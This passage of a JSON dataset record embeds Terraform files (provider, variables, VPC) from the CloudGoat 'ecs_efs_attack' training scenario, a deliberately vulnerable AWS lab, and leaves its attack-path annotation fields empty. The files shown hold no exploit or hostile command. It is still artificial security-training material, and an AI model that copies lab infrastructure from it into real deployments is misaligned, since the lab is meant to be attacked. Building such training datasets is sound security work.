+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/provider.tf",
+      "member_sha256": "18db916056912c79fb391099ac9f2b529afdb80e1b45fc168476c1b20ab6a225",
+      "bytes": 490,
+      "content_kind": "tf",
+      "text": "## This configures the minimum required Terraform and provider versions.\n## Configure the AWS profile and region specified in the variables as well as default tags.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/variables.tf",
+      "member_sha256": "98f0685a7e9b7e340c57a375e2089d33fbc745d88cf403e36a51b1933d86e37a",
+      "bytes": 849,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming\"\n  type        = string\n}\n\nvariable \"region\" {\n  default = \"us-east-1\"\n  type    = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"ssh-public-key-for-ec2\" {\n  description = \"SSH Public Key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\nvariable \"ssh-private-key-for-ec2\" {\n  description = \"SSH Private Key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario\"\n  default     = \"ecs_efs_attack\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/vpc.tf",
+      "member_sha256": "c58006dc2e4dbc44e00d200827bc1d4928710802c1c5e2fdc4d81a72b5fee44c",
+      "bytes": 1693,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"cg-vpc\" {\n  cidr_block           = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} VPC\"\n  })\n}\n\n#Internet Gateway\nresource \"aws_internet_gateway\" \"cg-internet-gateway\" {\n  vpc_id = aws_vpc.cg-vpc.id\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Internet Gateway\"\n  })\n}\n\n#Public Subnets\nresource \"aws_subnet\" \"cg-public-subnet-1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.10.0/24\"\n  vpc_id            = aws_vpc.cg-vpc.id\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Public Subnet #1\"\n  })\n}\n\nresource \"aws_subnet\" \"cg-public-subnet-2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.20.0/24\"\n  vpc_id            = aws_vpc.cg-vpc.id\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Public Subnet #2\"\n  })\n}\n\n#Public Subnet Routing Table\nresource \"aws_route_table\" \"cg-public-subnet-route-table\" {\n  vpc_id = aws_vpc.cg-vpc.id\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.cg-internet-gateway.id\n  }\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Route Table for Public Subnet\"\n  })\n}\n\n#Public Subnets Routing Associations\nresource \"aws_route_table_association\" \"cg-public-subnet-1-route-association\" {\n  subnet_id      = aws_subnet.cg-public-subnet-1.id\n  route_table_id = aws_route_table.cg-public-subnet-route-table.id\n}\n\nresource \"aws_route_table_association\" \"cg-public-subnet-2-route-association\" {\n  subnet_id      = aws_subnet.cg-public-subnet-2.id\n  route_table_id = aws_route_table.cg-public-subnet-route-table.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "8c5154764635cc93a2e9d88a1c992e203fe51d868cb0e14d7d7a220ea565f261",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
